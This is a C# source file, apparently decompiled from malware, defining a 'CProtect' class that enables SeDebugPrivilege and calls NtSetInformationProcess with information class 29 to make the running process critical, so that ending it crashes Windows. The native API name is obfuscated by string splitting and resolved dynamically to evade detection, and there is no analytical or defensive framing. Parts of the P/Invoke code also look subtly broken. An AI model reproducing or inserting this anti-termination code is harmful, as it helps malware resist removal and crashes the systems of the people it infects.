using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal class CProtect
{
	public delegate IntPtr NtSetInformationProcessA([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, [In] IntPtr ProcessInformation, [In] int ProcessInformationLength);

	private struct LUID
	{
		public uint LowPart;

		public int HighPart;
	}

	private struct LUID_AND_ATTRIBUTES
	{
		public LUID Luid;

		public uint Attributes;
	}

	private struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
		public LUID_AND_ATTRIBUTES[] Privileges;
	}

	private readonly NtSetInformationProcessA NtSetInformationProcess;

	private const uint TOKEN_QUERY = 8u;

	private const uint TOKEN_ADJUST_PRIVILEGES = 32u;

	private const string SE_DEBUG_NAME = "SeDebugPrivilege";

	private const uint SE_PRIVILEGE_ENABLED = 2u;

	private const int ANYSIZE_ARRAY = 1;

	private const int iBreakTermination = 29;

	public CProtect()
	{
		NtSetInformationProcess = Dynamic.CreateApi<NtSetInformationProcessA>("ntdll", "Nt..Set..Information..Process".Replace("..", null));
	}

	public void ProtectProcess(bool bProtect)
	{
		IntPtr currentProcess = GetCurrentProcess();
		GetPrivilegs("SeDebugPrivilege");
		IntPtr intPtr = IntPtr.Zero;
		if (bProtect)
		{
			intPtr = new IntPtr(29);
		}
		NtSetInformationProcessA ntSetInformationProcess = NtSetInformationProcess;
		IntPtr processInformation = new IntPtr(VarPtr(intPtr));
		ntSetInformationProcess(currentProcess, 29, processInformation, Marshal.SizeOf((object)(nint)intPtr));
	}

	private bool GetPrivilegs(string sPrivileg)
	{
		IntPtr currentProcess = GetCurrentProcess();
		LUID lUID = default(LUID);
		TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
		TOKEN_PRIVILEGES PreviousState = default(TOKEN_PRIVILEGES);
		IntPtr tokenHandle = default(IntPtr);
		if (!OpenProcessToken(currentProcess, 40u, tokenHandle))
		{
			return false;
		}
		if (!LookupPrivilegeValue(string.Empty, sPrivileg, lUID))
		{
			return false;
		}
		NewState.Privileges = new LUID_AND_ATTRIBUTES[1];
		NewState.PrivilegeCount = 1u;
		NewState.Privileges[0].Attributes = 2u;
		NewState.Privileges[0].Luid = lUID;
		return AdjustTokenPrivileges(tokenHandle, DisableAllPrivileges: false, ref NewState, Marshal.SizeOf((object)NewState), ref PreviousState, 0u);
	}

	private int VarPtr(object o)
	{
		return GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject().ToInt32();
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, IntPtr TokenHandle);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, LUID lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, uint ReturnLengthInBytes);
}
